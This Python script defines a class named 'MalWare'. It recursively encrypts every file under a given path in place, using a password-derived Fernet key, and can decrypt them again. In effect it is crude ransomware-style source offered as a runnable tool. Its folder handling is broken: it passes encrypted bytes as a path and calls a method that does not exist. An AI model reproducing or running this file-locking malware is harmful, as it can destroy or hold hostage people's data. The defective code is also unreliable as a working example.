import cryptography
from  cryptography.fernet import Fernet
import secrets
import getpass
import sys
from pathlib import Path
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
import base64
from inspect import currentframe,getframeinfo
from cryptography.fernet import InvalidToken
import argparse


frame =  currentframe()

class MalWare():
   
    def generateSalt(self):
        # salt convert
        return secrets.token_hex().encode()
    
        # write  a file or read file 
    def  reuFile(self,file,mode,data=None):
        try:
            if(mode=='rb'):
                with open  (file,mode)  as f:
                    data = f.read()
                    return data
                    
            elif(mode=='wb' and data):
                with open  (file,mode)  as f:
                    f.write(data)
                    return
    
        except Exception as err:
            err= self.Error('HAVE A LOOK AT FILE METHOD',frame.f_lineno)
            print(err['error'] + ' at line ' +str(err['line']))
    # generate key 

    def generateKey(self,salt,password):
        kdf =  Scrypt(salt=salt,length=32,n=2**14,r=8,p=1)
        derive =  kdf.derive(password.encode())
        return base64.urlsafe_b64encode(derive)
    # error method
    def Error(self,message,line):
        return {
            'error':f'[{message}]',
            'line':line
        }

    # encrypt file or folder

    def encryptF(self,path,key):
        F = Fernet(key)
        # iterate through folders and their subd and files
        structure = Path(path).glob('*')
        for struct  in structure:
            print(struct)
            # encrypt files
            if struct.is_file():
              try:
            
                #   read data
                  readData = self.reuFile(struct,'rb')
                  readData = F.encrypt(readData)
                # writeData
                  self.reuFile(struct,'wb',readData)
                  print(f'[+]E-> {struct} '+'success')
                  
          
              except Exception as err:
                  err= self.Error('HAVE A LOOK AT FILE METHOD',frame.f_lineno)
                  print(err['error'] + ' at line ' +str(err['line']))
                  print(f'[-]E-> {struct} '+'failed')
                  
         # encrypt folder
            if(struct.is_dir()):
                try:
                    self.encryptF(F.encrypt(struct),key)
                    print(f'[+]E-> {struct} '+'success')
                except Exception as err:
                    err= self.Error('HAVE A LOOK AT FILE METHOD',frame.f_lineno)
                    print(err['error'] + ' at line ' +str(err['line']))
                    print(f'[-]E-> {struct} '+'failed')
                    
                    
 


    def decryptF(self,path,key):
        F = Fernet(key)
        # iterate through folders and their subd and files
        structure = Path(path).glob('*')
        for struct  in structure:
            # encrypt files
            if struct.is_file():
              try:
            
                #  read data
                  readData = self.reuFile(struct,'rb')
                  info = F.decrypt(readData)
                # writeData
                  self.reuFile(struct,'wb',info)
                  print(f'[+]D-> {struct} '+'success')
          
              except Exception as err:
                  err= self.Error('HAVE A LOOK AT FILE METHOD',frame.f_lineno)
                  print(err['error'] + ' at line ' +str(err['line']))
                  print(f'[-]D-> {struct} '+'failed')
                  
         # encrypt folder
            if(struct.is_dir()):
                try:
                    
                    self.encrypt(F.decrypt(struct),key)
                except  InvalidToken:
                    err= self.Error('Incorrect Password',frame.f_lineno)
                    print(err['error'] + ' at line ' +str(err['line']))


     

            

        



mal = MalWare()
# main function
def main(args):
        if(args.e and args.d):
            print('You Can Either Encrypt Or Decrypt')
            exit()
      
        if (args.e and args.path):
            print('ENCRYPTING...')
            if(Path('newSalt.txt').is_file()):
                passwd =  getpass.getpass()
                if(passwd==''):
                    print('Password Is Required ',frame.f_lineno) 
                # read salt from file
                readSalt = mal.reuFile('newSalt.txt','rb')
                # generate key
                key = mal.generateKey(readSalt,passwd)
                # encrypt
                mal.encryptF(args.path,key)
            else:
                passwd =  getpass.getpass()
                if(passwd==''):
                    print('Password Is Required ',frame.f_lineno) 
                # generate salt
                salt = mal.generateSalt()
                 # read salt from file
                mal.reuFile('newSalt.txt','wb',salt)
                # generate key
                key = mal.generateKey(salt,passwd)
                 # write key to file
                mal.reuFile('newkey.key','wb',key)
                 # encrypt
                mal.encryptF(args.path,key)
        
        elif (args.d and args.path):
                print('DECRYPTING...')
                passwd = getpass.getpass('Enter Password Your Used To Encrypt: ')
               # read salt 
                readSalt = mal.reuFile('newSalt.txt','rb')
                # generate key
                key = mal.generateKey(readSalt,passwd)
                # decrypt 
                mal.decryptF(args.path,key)
                print('SUCCESS...')




parser =  argparse.ArgumentParser()
parser.add_argument('-path',help='file to encrypting and decrypting',action='store' ,type=str)
parser.add_argument('-e',help='for encrypting', action='store_true' )
parser.add_argument('-d',help='for decrypting',action='store_true')
args = parser.parse_args()
print(args)
if(len(sys.argv[2:])==0):
    parser.print_help()
    parser.exit()
if __name__=='__main__':
    main(args)



